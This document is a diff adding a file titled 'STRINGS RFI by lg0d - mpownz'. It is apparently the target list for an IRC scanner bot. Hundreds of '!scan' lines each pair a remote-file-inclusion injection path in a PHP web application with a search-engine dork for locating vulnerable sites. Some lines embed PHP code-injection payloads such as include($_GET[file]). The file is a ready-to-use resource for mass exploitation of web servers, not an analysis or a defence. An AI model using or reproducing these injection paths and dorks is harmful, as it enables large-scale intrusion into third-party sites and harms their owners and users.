@@ -1,0 +1,1472 @@
+#
+# STRINGS RFI by lg0d - mpownz
+#  
+#  *no allinurl
+#  *no inurl
+#  *no intitle
+#  *no allfusion
+#
+#
+######### 
+      ##  
+     ##   ####### ####### ####### ##              ##
+    ##    #       #     # #       ##              ##
+   ##     #       #     # #        ##            ##
+  ##      #       #  #### #####     ##          ##     
+ ##       #       #   #   #          ##   ##   ##
+##        #       #    #  #           ## #  # ##
+######### ####### #     # #######      ##    ## 
+
+!- START
+
+!scan /index.php?abg_path= "index.php?abg_path="
+!scan /index.php?abg_path= "africabegone"
+!scan /errors.php?error= "Links" "|" "News" "|" "Contact Us" "|" "About us" "|" "Privacy" "|" "Terms" "|" "FAQ" "|" "Add feedback" "|" "Invite a friend" "|" "Bookmark"
+!scan /errors.php?error= %22Links%22+%22%7C%22+%22News%22+%22%7C%22+%22Contact+Us%22+%22%7C%22+%22About+us%22+%22%7C%22+%22Privacy%22+%22%7C%22+%22Terms%22+%22%7C%22+%22FAQ%22+%22%7C%22+%22Add+feedback%22+%22%7C%22+%22Invite+a+friend%22+%22%7C%22+%22Bookmark%22
+!scan /poll/comments.php?id={${include($ddd)}}{${exit()}}&ddd= "Advanced Poll"
+!scan /poll/comments.php?id=%7B$%7Binclude($ddd)%7D% 7D%7B$%7Bexit()%7D%7D&ddd= "comments.php"
+!scan /?prefix= %22Home%22+%22%7C%22+%22Sell+an+item%22+%22%7C%22+%22Register+now%22+%22%7C%22+%22Login%22+%22%7C%22+%22Help%22+%22%7C%22+%22About+Us%22+%22%7C%22+%22Terms+%26+Conditions%22
+!scan /?prefix= "Home" "|" "Sell an item" "|" "Register now" "|" "Login" "|" "Help" "|" "About Us" "|" "Terms & Conditions"
+!scan /?include_path= "action"+"poll_ident"
+!scan /?include_path= "guestbook"
+!scan /Orca-2.0.beta2/layout/default/params.php?gConf[dir][layouts]= "Powered by Orca Interactive Forum Script"
+!scan /poll/comments.php?id= "comments.php"
+!scan /poll/comments.php?id= "poll_ident"
+!scan /poll/comments.php?id= "action"+"poll_ident"
+!scan /poll/comments.php?id= "poll"
+!scan /vwar/admin/admin.php?vwar_root= "Powered by: Virtual War"
+!scan /vwar/admin/admin.php?vwar_root= "Powered by: Virtual War" site:br
+!scan /vwar/admin/admin.php?vwar_root= "Powered by: Virtual War" site:de
+!scan /vwar/admin/admin.php?vwar_root= "Powered by: Virtual War v1.5.0"
+!scan /hw3.php?daysonly=0).include($_GET[file]).(0&file= "Current Conditions" "Sun & Moon Information"
+!scan /index.php?langue= /index.php?langue=
+!scan /admin.php?include_path= admin.php
+!scan /modules/Forums/admin/admin_db_utilities.php?phpbb_root_path= "PHP-Nuke"
+!scan /modules/Forums/favorites.php?nuke_bb_root_path= "Powered by Platinum"
+!scan /browser/resource/categories/resource_categories_view.php?CLASSES_ROOT= "resource_categories_view.php"
+!scan /src/browser/resource/categories/resource_categories_view.php?CLASSES_ROOT= "resource_categories_view.php"
+!scan /include/plugins/jrBrowser/purchase.php?jamroom[jm_dir]= "purchase.php"
+!scan /include/plugins/jrBrowser/purchase.php?jamroom[jm_dir]= "Powered By Jamroom"
+!scan /include/plugins/jrBrowser/purchase.php?jamroom[jm_dir]= "Powered By Jamroom"+site:co.il
+!scan /naboard_pnr.php?skin= "naboard"
+!scan /main.php?appserv_root= 8080/appserv/main.php?appserv_root=
+!scan /appserv/main.php?appserv_root= "/appserv/main.php?appserv_root="
+!scan /appserv/main.php?appserv_root= 8080/appserv/main.php?appserv_root=
+!scan /appserv/main.php?appserv_root= "The AppServ Open Project"
+!scan /appserv/main.php?appserv_root= 8080/appserv/
+!scan /apps/apps.php?app= WebDesktop
+!scan /accounts/inc/include.php?language=0&lang_settings[0][1]= "powered by Icewarp"
+!scan :32000/accounts/inc/include.php?language=0&lang_settings[0][1]= "powered by Icewarp"
+!scan :8080/accounts/inc/include.php?language=0&lang_settings[0][1]= "powered by Icewarp"
+!scan /browse.php/header.php?prefix= %22Home%22+%22%7C%22+%22Sell+an+item%22+%22%7C%22+%22Register+now%22+%22%7C%22+%22Login%22+%22%7C%22+%22Help%22+%22%7C%22+%22About+Us%22+%22%7C%22+%22Terms+%26+Conditions%22
+!scan /faqsupport/samplefaqsupport.php?path%5Bdocroot%5D= "oneadmin"
+!scan /oneadmin/faqsupport/samplefaqsupport.php?path%5Bdocroot%5D= "oneadmin"
+!scan /?custompluginfile%5B%5D= subdreamer
+!scan /browser_crm/pub/clients.php?bcrm_pub_root= Copyright © 2007 BrowserCRM Ltd
+!scan /browser_crm/pub/clients.php?bcrm_pub_root= "Copyright © 2007 BrowserCRM Ltd"
+!scan /browser_crm/pub/clients.php?bcrm_pub_root= "BrowserCRM Ltd"
+!scan /joinus.php?vwar_root= "Powered by: Virtual War"
+!scan /language/lang_english/lang_main_album.php?phpbb_root_path= "Powered by phpBB2"
+!scan /poll/booth.php?include_path= "booth.php"
+!scan /poll/booth.php?include_path= "poll"
+!scan /poll/booth.php?include_path= "poll_ident"
+!scan /poll/booth.php?include_path= "action"+"poll_ident"
+!scan /poll/poll_ssi.php?include_path= "poll_ssi.php"
+!scan /poll/poll_ssi.php?include_path= "action"+"poll_ident"
+!scan /phorum/plugin/replace/plugin.php?PHORUM[settings_dir]= "/phorum/login.php"
+!scan /show.php?PollDir= "poll"
+!scan /show.php?PollDir= "show.php?PollDir="
+!scan /poll/poll_ssi.php?include_path= poll_ssi.php
+!scan /poll/poll_ssi.php?include_path= "poll_ssi.php"
+!scan /poll/poll_ssi.php?include_path= "Advanced poll"
+!scan /poll/poll_ssi.php?include_path= Advanced poll
+!scan /poll.php?root_path= poll.php
+!scan /poll.php?root_path= "poll.php"
+!scan /inc/formmail.inc.php?script_root= "Powered By Form Mail Script 2.2"
+!scan /authentication/smf/smf.functions.php?pConfig_auth[smf_path]= "phpRaider"
+!scan /authentication/smf/smf.functions.php?pConfig_auth[smf_path]= %22phpRaider%22%20site%3Aname
+!scan /templates/barrel/template.tpl.php?renderer= template.tpl.php
+!scan /templates/barry/template.tpl.php?renderer= template.tpl.php
+!scan /templates/mylook/template.tpl.php?renderer= template.tpl.php
+!scan /templates/oerdec/template.tpl.php?renderer= template.tpl.php
+!scan /templates/penguin/template.tpl.php?renderer= template.tpl.php
+!scan /templates/sidebar/template.tpl.php?renderer= template.tpl.php
+!scan /templates/slashdot/template.tpl.php?renderer= template.tpl.php
+!scan /templates/text-only/template.tpl.php?renderer= template.tpl.php
+!scan /applications/don3_requiem.don3app/don3_requiem.php?app_path= "don3"
+!scan /applications/frontpage.don3app/frontpage.php?app_path= "don3"
+!scan /DON3/applications/don3_requiem.don3app/don3_requiem.php?app_path= "don3"
+!scan /DON3/applications/frontpage.don3app/frontpage.php?app_path= "don3"
+!scan /viewtopic.php?p=15&sid=be4c914eb746ac7c96beea717fdfc692/&highlight=%2527.include($_GET[a]),exit.%2527&a= "Powered by phpBB 2.0"
+!scan /update/update5.php?lang= "Powered by photokorn"
+!scan /index.php?config=1&base_datapath= wmprint.php
+!scan /index.php?config=1&base_datapath= *.php?ArtCat=*
+!scan /index.php?config=1&base_datapath= *.php?Artid=*
+!scan /index.php?config=1&base_datapath= wmview.php
+!scan /*.php?page= *.php?page=*.php"
+!scan //addpost_newpoll.php?addpoll=preview&thispath= "/ubbthreads/"
+!scan //modules/PNphpBB2/includes/functions_admin.php?phpbb_root_path= modules.php?name=PNphpBB2
+!scan //squirrelcart/cart_content.php?cart_isp_root= /squirrelcart/ 
+!scan /?p= .php5?id=
+!scan /?pag= .php5?id=
+!scan /?page= .php5?id=
+!scan /phpAdsNew/view.inc.php?phpAds_path= "powered by phpAdsNew 2"
+!scan /phpAdsNew/view.inc.php?phpAds_path= "powered by phpAdsNew"
+!scan /amember/plugins/payment/secpay/secpay.inc.php?config%5broot_dir%5d= "amember"
+!scan /?pg= .php5?id=
+!scan /active/components/xmlrpc/client.php?c[components]= "Pindorama"
+!scan /language.inc.php?langs_dir= "language.inc.php"
+!scan /admin/index.php?o= "admin/index.php"
+!scan /nuseo/admin/nuseo_admin_d.php?nuseo_dir= "NuSEO PHP"
+!scan /FormTools1_5_0/global/templates/admin_page_open.php?g_root_dir= "admin_page_open.php"
+!scan /FormTools1_5_0/global/templates/client_page_open.php?g_root_dir= "client_page_open.php"
+!scan /account.php?action= .php?action=
+!scan /account.php?action= account.php?action=
+!scan /account.php?action= ".php?action="
+!scan /account.php?action= "account.php?action="
+!scan /include/monitoring/engine/MakeXML4statusCounter.php?fileOreonConf= "MakeXML4statusCounter.php"
+!scan /include/monitoring/engine/MakeXML.php?fileOreonConf= "MakeXML.php"
+!scan /accounts.php?command= ".php?command="
+!scan /addmedia.php?factsfile[$LANGUAGE]= phpGedView
+!scan /addpost_newpoll.php?addpoll=preview&thispath= "/ubbthreads/"
+!scan /addpost_newpoll.php?addpoll=preview&thispath= "ubbthreads"
+!scan /addpost_newpoll.php?addpoll=preview&thispath= /ubbthreads/
+!scan /addpost_newpoll.php?addpoll=preview&thispath= ubbthreads
+!scan /admin.php?cal_dir=
+!scan /admin.php?cal_dir= 
+!scan /admin.php?page= "admin.php?page=*.php"
+!scan /admin/autoclose.php?subd= "Helpdesk Powered by Kayako eSupport"
+!scan /admin/business_inc/saveserver.php?thisdir= "saveserver.php?thisdir="
+!scan /admin/classes/pear/OLE/PPS.php?homedir= "You have not provided a survey identification number"
+!scan /admin/classes/pear/OLE/PPS/File.php?homedir= "You have not provided a survey identification number"
+!scan /admin/classes/pear/OLE/PPS/Root.php?homedir= "You have not provided a survey identification number"
+!scan /admin/classes/pear/Spreadsheet/Excel/Writer.php?homedir= "You have not provided a survey identification number"
+!scan /admin/classes/pear/Spreadsheet/Excel/Writer/BIFFwriter.php?homedir= "You have not provided a survey identification number"
+!scan /admin/classes/pear/Spreadsheet/Excel/Writer/Format.php?homedir= "You have not provided a survey identification number"
+!scan /admin/classes/pear/Spreadsheet/Excel/Writer/Parser.php?homedir= "You have not provided a survey identification number"
+!scan /admin/classes/pear/Spreadsheet/Excel/Writer/Workbook.php?homedir= "You have not provided a survey identification number"
+!scan /admin/classes/pear/Spreadsheet/Excel/Writer/Worksheet.php?homedir= "You have not provided a survey identification number"
+!scan /admin/doeditconfig.php?thispath=../includes&config[path]= "admin"
+!scan /admin/editor2/spaw_control.class.php?spaw_root= "cjaycontent"+site:net 
+!scan /admin/inc/change_action.php?format_menue= "PHPNews Version 0.93"
+!scan /admin/includes/admin_header.php?level= "admin_header.php"
+!scan /admin/includes/author_panel_header.php?level= "author_panel_header.php"
+!scan /admin/index.php?o= "admin/index.php";
+!scan /admin/spaw/spaw_control.class.php?spaw_root= "xt_conteudo"+site:fr
+!scan /admin/spaw/spaw_control.class.php?spaw_root= "xt_conteudo"+site:net
+!scan /admin_modules/admin_module_deldir.inc.php?config[path_src_include]= "Powered by yappa-ng 2.3.1"
+!scan /administrator/components/com_a6mambocredits/admin.a6mambocredits.php?mosConfig_live_site= "com_a6mambocredits"
+!scan /administrator/components/com_comprofiler/plugin.class.php?mosConfig_absolute_path= ".com.*/index.php?option=com_comprofiler"
+!scan /administrator/components/com_comprofiler/plugin.class.php?mosConfig_absolute_path= "us/index.php?option=com_comprofiler"
+!scan /administrator/components/com_comprofiler/plugin.class.php?mosConfig_absolute_path= /index.php?option=com_comprofiler"
+!scan /administrator/components/com_cropimage/admin.cropcanvas.php?cropimagedir= ".tr./components"
+!scan /administrator/components/com_cropimage/admin.cropcanvas.php?cropimagedir= "com_cropimage"
+!scan /administrator/components/com_linkdirectory/toolbar.linkdirectory.html.php?mosConfig_absolute_path= ".de.*/com_linkdirectory"
+!scan /administrator/components/com_linkdirectory/toolbar.linkdirectory.html.php?mosConfig_absolute_path= "com_linkdirectory"
+!scan /administrator/components/com_mgm/help.mgm.php?mosConfig_absolute_path=  ".de.*/com_mgm"
+!scan /administrator/components/com_peoplebook/param.peoplebook.php?mosConfig_absolute_path= "com_peoplebook"
+!scan /administrator/components/com_peoplebook/param.peoplebook.php?mosConfig_absolute_path= "com_peoplebook" 
+!scan /administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path= "com_remository
+!scan /administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path= "com_remository"
+!scan /administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path= "Mambo"
+!scan /administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path= com_remository
+!scan /administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path= "us/index.php?option=com_remository
+!scan /administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path= .com/index.php?option=com_remository
+!scan /administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path= /com_remository/
+!scan /administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path= /index.php?option=com_remository
+!scan /administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path= index.php?option=com_remository
+!scan /administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path= Mambo
+!scan /administrator/components/com_serverstat/install.serverstat.php?mosConfig_absolute_path= "com_serverstat"
+!scan /administrator/components/com_serverstat/install.serverstat.php?mosConfig_absolute_path= com_serverstat
+!scan /administrator/components/com_uhp/uhp_config.php?mosConfig_absolute_path= "com_uhp"
+!scan /administrator/components/com_webring/admin.webring.docs.php?component_dir= "com_webring"
+!scan /agendax/addevent.inc.php?agendax_path=
+!scan /agendax/addevent.inc.php?agendax_path= 
+!scan /akocomments.php?mosConfig_absolute_path= akocomments.php
+!scan /al_initialize.php?alpath= "Powered by AutoLinks Pro"
+!scan /announcements.php?phpraid_dir= "phpraid signup"
+!scan /announcements.php?phpraid_dir= "phpraid"
+!scan /announcements.php?phpraid_dir= php raid
+!scan /announcements.php?phpraid_dir= phpraid
+!scan /announcements.php?phpraid_dir= phpraid signup
+!scan /app/common/lib/codeBeautifier/Beautifier/Core.php?BEAUT_PATH= "phpCodeGenie v. 3.0.2"
+!scan /app/common/lib/codeBeautifier/Beautifier/Core.php?BEAUT_PATH= phpCodeGenie
+!scan /application/include/modules/area/api_link.php?link=organisation&sub_link=profile&xml_paramsorganisationinfo0classification=1&cfgfile= TenderSystem
+!scan /arg.php?arg= .php?arg=
+!scan /args.php?arg= .php?arg=
+!scan /define.php?term= "define.php"
+!scan /atom.php5?page= .php5?id=
+!scan /auto.php?inc= ".php?inc="
+!scan /auto.php?page= auto.php?page=
+!scan /avatar.php?page= "avatar.php?page="
+!scan /base.php?f1= ".php?f1="
+!scan /base.php?f1= "base.php?f1="
+!scan /bb_usage_stats/include/bb_usage_stats.php?phpbb_root_path= forum
+!scan /beacon/language/1/splash.lang.php?languagePath= /beacon/
+!scan /bemarket/postscript/postscript.php?p_mode= "bemarket"
+!scan /bemarket/postscript/postscript.php?p_mode= bemarket
+!scan /big.php?pathtotemplate= ".de.*"big.php?"
+!scan /board.php?see= ".php?see="
+!scan /board.php?see= "board.php?see="
+!scan /book.php5?page= php5?page=
+!scan /bottom.php?style= "bottom.php?style="
+!scan /bp_ncom.php?bnrep= "Script r&#65533;alis&#65533; par BinGo PHP" 
+!scan /bz/squito/photolist.inc.php?photoroot= "Squitosoft All Rights Reserved"
+!scan /cal.func.php?dir_edge_lang= "cal.func.php?dir_edge_lang=
+!scan /calendar.php?l= "calendar.php?l="
+!scan /calendar.php?l= calendar.php?l=
+!scan /calendar.php?p= "calendar.php?p="
+!scan /calendar.php?p= calendar.php?p=
+!scan /calendar.php?pg= "calendar.php?pg="
+!scan /calendar.php?pg= calendar.php?pg=
+!scan /calendar.php?s= "calendar.php?s="
+!scan /calendar.php?s= calendar.php?s=
+!scan /canal.php?meio= ".php?meio="
+!scan /chat/inc/cmses/aedating4CMS.php?dir[inc]= flashchat site:.ru
+!scan /checkpageinc.php?SpellIncPath= "checkpageinc.php"
+!scan /class.mysql.php?path_to_bt_dir= "powered by paBugs 2.0 Beta 3"
+!scan /class.mysql.php?path_to_bt_dir= "powered by paBugs 2.0 Beta 3"   
+!scan /classes.php?LOCAL_PATH= "powered by siteframe"
+!scan /classes/adodbt/sql.php?classes_dir= "adobt"
+!scan /classes/adodbt/sql.php?classes_dir= "index2.php?option=rss"
+!scan /classes/adodbt/sql.php?classes_dir= adobt
+!scan /classes/adodbt/sql.php?classes_dir= "/classes/adodbt/sql.php?classes_dir="
+!scan /classes/adodbt/sql.php?classes_dir= adobt site:pl
+!scan /classes/adodbt/sql.php?classes_dir= adobt site:us
+!scan /classified_right.php?language_dir= "classified.php"
+!scan /classified_right.php?language_dir= "phpbazar"
+!scan /classified_right.php?language_dir= classified.php
+!scan /classified_right.php?language_dir= classified.php phpbazar
+!scan /classified_right.php?language_dir= phpbazar
+!scan /cmd.php?arg= .php?arg=
+!scan /codebb/lang_select?phpbb_root_path= codebb
+!scan /codebb/lang_select?phpbb_root_path= codebb 1.1b3
+!scan /coin_includes/constants.php?_CCFG[_PKG_PATH_INCL]= "phpCOIN 1.2.3"
+!scan /coin_includes/constants.php?_CCFG[_PKG_PATH_INCL]= "phpCOIN"
+!scan /coin_includes/constants.php?_CCFG[_PKG_PATH_INCL]= "powered by phpCOIN 1.2.3"
+!scan /coin_includes/constants.php?_CCFG[_PKG_PATH_INCL]= phpCOIN
+!scan /coin_includes/constants.php?_CCFG[_PKG_PATH_INCL]= phpCOIN 1.2.3
+!scan /coin_includes/constants.php?_CCFG[_PKG_PATH_INCL]= powered by phpCOIN 1.2.3
+!scan /common/func.php?CommonAbsDir=  func.php?
+!scan /components/com_artlinks/artlinks.dispnew.php?mosConfig_absolute_path= "com_artlinks"
+!scan /components/com_artlinks/artlinks.dispnew.php?mosConfig_absolute_path= "com_artlinks" 
+!scan /components/com_cpg/cpg.php?mosConfig_absolute_path= index.php?option=com_cpg
+!scan /components/com_cpg/cpg.php?mosConfig_absolute_path= "com_cpg" 
+!scan /components/com_extcalendar/admin_events.php?CONFIG_EXT[LANGUAGES_DIR]=
+!scan /components/com_extcalendar/admin_events.php?CONFIG_EXT[LANGUAGES_DIR]= com_extcalendar
+!scan /components/com_extended_registration/registration_detailed.inc.php?mosConfig_absolute_path=
+!scan /components/com_extended_registration/registration_detailed.inc.php?mosConfig_absolute_path= "com_extended_registration"
+!scan /components/com_extended_registration/registration_detailed.inc.php?mosConfig_absolute_path= com_extended_registration
+!scan /components/com_facileforms/facileforms.frame.php?ff_compath= "com_facileforms"
+!scan /components/com_facileforms/facileforms.frame.php?ff_compath= com_facileforms
+!scan /components/com_facileforms/facileforms.frame.php?ff_compath= "com_facileforms" site:.ar
+!scan /components/com_facileforms/facileforms.frame.php?ff_compath= "com_facileforms" site:.org
+!scan /components/com_forum/download.php?phpbb_root_path= "com_forum"
+!scan /components/com_forum/download.php?phpbb_root_path= com_forum
+!scan /components/com_galleria/galleria.html.php?mosConfig_absolute_path= ".net.*"com_galleria/"
+!scan /components/com_galleria/galleria.html.php?mosConfig_absolute_path= "com_galleria/"
+!scan /components/com_mtree/Savant2/Savant2_Plugin_stylesheet.php?mosConfig_absolute_path= "com_mtree"
+!scan /components/com_mtree/Savant2/Savant2_Plugin_textarea.php?mosConfig_absolute_path= "/com_mtree/"
+!scan /components/com_performs/performs.php?mosConfig_absolute_path= "com_performs"
+!scan /components/com_performs/performs.php?mosConfig_absolute_path= com_performs
+!scan /components/com_phpshop/toolbar.phpshop.html.php?mosConfig_absolute_path=
+!scan /components/com_phpshop/toolbar.phpshop.html.php?mosConfig_absolute_path= "com_phpshop"
+!scan /components/com_rsgallery/rsgallery.html.php?mosConfig_absolute_path= com_rsgallery
+!scan /components/com_rsgallery/rsgallery.html.php?mosConfig_absolute_path= "com_rsgallery"
+!scan /components/com_rsgallery/rsgallery.html.php?mosConfig_absolute_path= rs gallery
+!scan /components/com_rsgallery/rsgallery.html.php?mosConfig_absolute_path= rsgallery
+!scan /components/com_rsgallery/rsgallery.html.php?mosConfig_absolute_path= rsgallery.php
+!scan /components/com_simpleboard/image_upload.php?sbp= "com_simpleboard"
+!scan /components/com_smf/smf.php?mosConfig_absolute_path= "com_smf"
+!scan /components/com_zoom/includes/database.php?mosConfig_absolute_path= "com_zoom"
+!scan /components/com_zoom/includes/database.php?mosConfig_absolute_path= "index.php?option="com_zoom"
+!scan /components/com_zoom/includes/database.php?mosConfig_absolute_path= com_zoom
+!scan /config.php?_CCFG[_PKG_PATH_DBSE]= mod.php?mod=siteinfo&id=
+!scan /config.php?path_to_root= "path_to_root"
+!scan /contenido.php?sec= "contenido.php?sec="
+!scan /contenido/classes/class.inuse.php
+!scan /content.php?inc= ".php?inc="
+!scan /content.php?page= "*content.php?page=*.php"
+!scan /content.php?page= "content.php?page=*.php"
+!scan /content.php?seite= .php?seite=
+!scan /content.php?seite= content.php?seite=
+!scan /crontab/run_billing.php?config[include_dir]= "MiniBill"
+!scan /crontab/run_billing.php?config[include_dir]= "run_billing.php"
+!scan /crontab/run_billing.php?config[include_dir]= "run_billing.php?config[include_dir]="
+!scan /csv_db/csv_db.cgi?fil e=file.extention
+!scan /cyberfolio/portfolio/msg/view.php?av= cyberfolio
+!scan /database.php?mosConfig_absolute_path= "powered by mambo"
+!scan /db.php?path_local= "db.php?path_local="
+!scan /dbase.php?action= .php?action=
+!scan /dbase.php?action= dbase.php
+!scan /dbase.php?action= dbase.php?action=
+!scan /default.php?arquivo= .php?arquivo=
+!scan /default.php?page= "/default.php?page=*.php"
+!scan /default.php?page= "default.php?page="
+!scan /default.php?vis= ".php?vis="
+!scan /define.php?term= ".php?term="
+!scan /detail.php?prod= ".php?prod="
+!scan /detail.php?prod= "detail.php?prod="
+!scan /details.php?loc= .php?loc=
+!scan /details.php?loc= details.php?loc=
+!scan /direct.php?loc= direct.php?loc=
+!scan /directions.php?loc= directions.php?loc=
+!scan /display.php?f= display.php?f=
+!scan /display.php?file= display.php?file=
+!scan /display.php?l= display.php?l=
+!scan /display.php?lang= display.php?lang=
+!scan /display.php?ln= display.php?ln=
+!scan /display.php?p= display.php?p=
+!scan /display.php?pag= display.php?pag=
+!scan /display.php?page= ".php?page="
+!scan /display.php?page= "display.php?page="
+!scan /display.php?page=&lang= ".php?page="
+!scan /display.php?page=&lang= "display.php?page="
+!scan /display.php?pg= display.php?pg=
+!scan /display.php?s= display.php?s=
+!scan /display.php?table= .php?table=
+!scan /display.php?table= display.php?table=
+!scan /download.php?sub= "download.php?sub="
+!scan /download.php?sub= download.php?sub=
+!scan /dreamaccount/auth.api.php?path= "powered by DreamAccount" 
+!scan /dreamaccount/auth.header.inc.php?da_path= "powered by DreamAccount"
+!scan /embed/day.php?path= "Calendar"
+!scan /embed/day.php?path= "Login to Calendar"
+!scan /embed/day.php?path= "WebCalendar"
+!scan /embed/day.php?path= Calendar
+!scan /embed/day.php?path= Login to Calendar
+!scan /embed/day.php?path= WebCalendar
+!scan /enc/content.php?Home_Path= "doodle cart"
+!scan /enc/content.php?Home_Path= "doodle"
+!scan /enc/content.php?Home_Path= "powered by doodle cart"
+!scan /enc/content.php?Home_Path= doodle
+!scan /enc/content.php?Home_Path= doodle cart
+!scan /enc/content.php?Home_Path= powered by doodle cart
+!scan /encapscms_PATH/core/core.php?root= encapscms_PATH
+!scan /eng.php?img= .php?img=
+!scan /eng.php?img= eng.php?img=
+!scan /esupport/admin/autoclose.php?subd= "Helpdesk Powered by Kayako eSupport" 
+!scan /eva/index.php3?aide= "index.php3?aide="
+!scan /eva/index.php3?perso= "index.php3?perso="
+!scan /exibir.php?abre= "exibir.php?abre="
+!scan /exibir.php?arquivo= .php?arquivo=
+!scan /exibir.php?get= "exibir.php?get="
+!scan /exibir.php?lang= "exibir.php?lang="
+!scan /exibir.php?p= "exibir.php?p="
+!scan /exibir.php?page= "exibir.php?page="
+!scan /experts.php?sub= "experts.php?sub="
+!scan /experts.php?sub= experts.php?sub=
+!scan /extensions/moblog/moblog_lib.php?basedir= "powered by pivot"
+!scan /extensions/moblog/moblog_lib.php?basedir= "powered by pivot" 
+!scan /folder.php?id= "folder.php?id="
+!scan /footer.inc.php?tfooter= "footer.inc.php?tfooter="
+!scan /forum.php?act= "forum.php?act="
+!scan /forum.php?seite= .php?seite=
+!scan /frag.php?exec= ".php?exec="
+!scan /frag.php?exec= "frag.php"
+!scan /frag.php?exec= "frag.php?exec="
+!scan /frame.php?loc= ".php?loc="
+!scan /functions.php?FORUM_LANGUAGE= "functions.php"
+!scan /functions.php?include_path= "powered by: phpecard"
+!scan /galerie.php?do= ".php?do="
+!scan /glossary.php?term= ".php?term="
+!scan /hall.php?file= "hall.php?file="
+!scan /hall.php?page= "hall.php?page="
+!scan /handlinger.php?vis= ".php?vis="
+!scan /header.php?abspath= "MobilePublisherPHP"
+!scan /header.php?abspath= MobilePublisherPHP
+!scan /help.php?css_path= phplive site:.ru
+!scan /help.php?css_path= phplive site:.uk
+!scan /help_text_vars.php?cmd=dir&PGV_BASE_DIRECTORY= PHP Ged View
+!scan /help_text_vars.php?cmd=dir&PGV_BASE_DIRECTORY= PHP GedView
+!scan /help_text_vars.php?cmd=dir&PGV_BASE_DIRECTORY= PHPGedView
+!scan /help_text_vars.php?cmd=dir&PGV_BASE_DIRECTORY= PHPGedView <= 3.3.7
+!scan /historytemplate.php?cms[support]=1&cms[tngpath]= "powered by The Next Generation of Genealogy Sitebuilding"
+!scan /home.php?a= ".php?a="
+!scan /home.php?a= "home.php?a="
+!scan /home.php?act= "home.php?act="
+!scan /home.php?act= home.php?act=
+!scan /home.php?action= "home.php?action="
+!scan /home.php?arg= .php?arg=
+!scan /home.php?content= "home.php?content="
+!scan /home.php?func= ".php?func="
+!scan /home.php?i= "home.php?i="
+!scan /home.php?i= home.php?i=
+!scan /home.php?inc= "home.php?inc="
+!scan /home.php?inc= home.php?inc=
+!scan /home.php?ln= .php?ln=
+!scan /home.php?ltr= ".php?ltr="
+!scan /home.php?pag= "/home.php?pag=*.php"
+!scan /home.php?pagina= "home.php?pagina="
+!scan /home.php?sit= ".php?sit="
+!scan /home.php?table= .php?table=
+!scan /home.php?x= "home.php?x="
+!scan /home1.php?ln= .php?ln=
+!scan /home2.php?ln= .php?ln=
+!scan /homepage.php?sel= "homepage.php?sel="
+!scan /homepage.php?sel= "homepage.php?sel=*.php"
+!scan /htmltonuke.php?filnavn= "htmltonuke.php?filnavn="
+!scan /ihm.php?p= "ihm.php?p="
+!scan /image.php?img= .php?img=
+!scan /image.php?img= image.php?img=
+!scan /img.php?loc= ".php?loc="
+!scan /img.php?loc= "img.php?loc="
+!scan /impex/ImpExData.php?systempath= "vbulletin"
+!scan /impex/ImpExData.php?systempath= intext:powered by vbulletin
+!scan /impex/ImpExData.php?systempath= intext:powered by vbulletin 
+!scan /impex/ImpExData.php?systempath= powered by vbulletin
+!scan /impex/ImpExData.php?systempath= vbulletin
+!scan /inc.php?inc= ".php?inc="
+!scan /inc/cmses/aedating4CMS.php?dir[inc]= flashchat site:br 
+!scan /inc/cmses/aedating4CMS.php?dir[inc]= flashchat site:br bp_ncom.php?bnrep= "Script r?alis? par BinGo PHP"
+!scan /inc/cmses/aedatingCMS.php?dir[inc]= "flashchat"
+!scan /inc/functions.inc.php?config[ppa_root_path]= "Index - Albums" index.php 
+!scan /inc/irayofuncs.php?irayodirhack= "/inc/"
+!scan /inc/nuke_include.php?newsSync_enable_phpnuke_mod=1&newsSync_NUKE_PATH= "newsSync 1.5.0rc6"
+!scan /inc/nuke_include.php?newsSync_enable_phpnuke_mod=1&newsSync_NUKE_PATH= "nuke_include.php"
+!scan /inc/nuke_include.php?newsSync_enable_phpnuke_mod=1&newsSync_NUKE_PATH= "nuke_include.php?newsSync_enable_phpnuke_mod=1&newsSync_NUKE_PATH="
+!scan /inc/session.php?sessionerror=0&lang= inc
+!scan /include.php?path[docroot]= "newspublish"
+!scan /include.php?sunPath= "include.php?sunPath="
+!scan /include/editfunc.inc.php?NWCONF_SYSTEM[server_path]= Newswriter
+!scan /include/editfunc.inc.php?NWCONF_SYSTEM[server_path]= site:.gr
+!scan /include/footer.inc.php?_AMLconfig[cfg_serverpath]= "powered by AllMyLinks"
+!scan /include/main.php?config[search_disp]=true&include_dir= /osticket/
+!scan /include/main.php?config[search_disp]=true&include_dir= /osticket/ site:fr
+!scan /include/main.php?config[search_disp]=true&include_dir= /osticket/ site:uk
+!scan /include/main.php?config[search_disp]=true&include_dir= /osticket/ site:us
+!scan /include/write.php?dir= /zboard/zboard.php
+!scan /includes/dbal.php?eqdkp_root_path= "EQdkp"
+!scan /includes/dbal.php?eqdkp_root_path= "powered by EQdkp"
+!scan /includes/dbal.php?eqdkp_root_path= EQdkp
+!scan /includes/dbal.php?eqdkp_root_path= powered by EQdkp
+!scan /includes/functions.php?phpbb_root_path= powered by Integramod
+!scan /includes/functions_portal.php?phpbb_root_path= "powered by Integramod"
+!scan /includes/get_header.php?vwar_root= get_header.php?vwar_root=
+!scan /includes/kb_constants.php?module_root_path= "Base"
+!scan /includes/kb_constants.php?module_root_path= "Knowledge Base"
+!scan /includes/kb_constants.php?module_root_path= "Knowledge"
+!scan /includes/kb_constants.php?module_root_path= "Powered by Knowledge Base"
+!scan /includes/kb_constants.php?module_root_path= Base
+!scan /includes/kb_constants.php?module_root_path= Knowledge
+!scan /includes/kb_constants.php?module_root_path= Knowledge Base
+!scan /includes/kb_constants.php?module_root_path= Powered by Knowledge Base
+!scan /includes/lang/language.php?path_to_root= "FrontAccounting"
+!scan /includes/orderSuccess.inc.php?glob=1&cart_order_id=1&glob[rootDir]= "powered by CubeCart 3.0.6"     
+!scan /includes/orderSuccess.inc.php?glob=1&cart_order_id=1&glob[rootDir]= "powered by CubeCart 3.0.6"      
+!scan /includes/search.php?GlobalSettings[templatesDirectory]= ".com"search.php?"
